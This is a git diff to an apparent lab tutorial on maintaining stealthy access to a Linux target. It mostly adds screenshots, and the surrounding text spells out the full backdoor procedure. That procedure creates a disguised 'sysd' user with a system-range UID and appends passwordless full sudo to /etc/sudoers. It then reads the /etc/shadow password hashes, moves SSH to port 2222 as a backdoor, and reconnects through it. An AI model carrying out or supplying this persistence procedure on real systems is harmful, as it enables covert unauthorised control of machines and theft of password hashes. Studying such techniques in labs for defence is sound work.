@@ -49,6 +49,10 @@ To be a "shadow" in the system means to remain as unnoticed as possible. To achi
 
     `passwd sysd`
 
+    Press enter on each of the next setting to leave them blank.
+
+    ![2](Images/2.PNG) 
+
 - ### System user's UID and GID
 
     UID (User Identified), and GID (Group Identifier) are numbers that identify users and groups. Numbers below 1000 are reserved for system processes. The "shadow user" should look like another process, so the following commands will do that.
@@ -57,30 +61,44 @@ To be a "shadow" in the system means to remain as unnoticed as possible. To achi
 
     `groupmod -g 777 sysd`
 
+    ![3](Images/3.PNG)
+
 - ### Grant full sudo privileges to the "shadow user" without the need of a password.
 
     On a Linux system, the sudoers file is the file where the privilege settings exist. Here, sudo access will be configured for the "shadow" user using the following command:
 
     `echo 'sysd ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers`
 
+    ![4](Images/4.PNG)
+
 - ### Testing
 
     To verify that the "shadow" user has full sudo privileges and is ready to use them without a password, use the following commands:
 
     Check sysd priviledges:
+
     `sudo  -lU sysd`
 
+    ![5](Images/5.PNG)
+
     Switch from current user to sysd user:
+
     `su sysd`
+
+    ![6](Images/6.PNG)
 
     To test the current user sudo privileges, we need to revoke any previous sudo privileges stored in the cache. The next command accomplishes this.
 
     `sudo -k`
 
+    ![7](Images/7.PNG)
+
     Check if ask for password when accessing the shadow file. This sensitive file holds the passwords' hash of all users in the system. Usually, only a sudo privilege user has access to this file. This user would need to enter a password to gain access. If no password is required, our setting pass the test. 
 
     `sudo cat /etc/shadow`
 
+    ![8](Images/8.PNG)
+    > Note in the image that sysd user is listed in the file with its respective password hash
 ---
 
 ## Step 2: Getting ready for a Smooth Sailing (Set the SSH backdoor connection)
@@ -91,9 +109,13 @@ We will use SSH (Secure Shell) to establish a remote connection with the target 
 
     `nano /etc/ssh/sshd_config`
 
-- Edit the sshd_config file:
+    ![9](Images/9.PNG)
+
+  - Edit the sshd_config file:
 
     `Port 2222`
+
+    ![10](Images/10.PNG)
 
 - Save and Exit
     ```
@@ -104,7 +126,9 @@ We will use SSH (Secure Shell) to establish a remote connection with the target 
 
 - Restart the SSH service to activate the new configuration:
 
-    `systemctl restart ssh`
+    `sudo systemctl restart ssh`
+
+    ![11](Images/11.PNG)
 
 ---
 
@@ -114,17 +138,17 @@ Exiting the target machine, then access it again through the previously created 
 
 - Exit the target machine
 
-    Exit the root account:
+    Enter the exit command and hit enter until exit the target machine
 
     `exit`
 
-    Exit the target machine:
+    ![12](Images/12.PNG)
+  
 
-    `exit `
-
-- Access the target throught the backdoor
+- Access the target throught the backdoor (change the ip address for the one of your target machine).
 
     `ssh sysd@192.168.6.105 -p 2222`
+
 
 - Use sudo to switch to the root user:
 
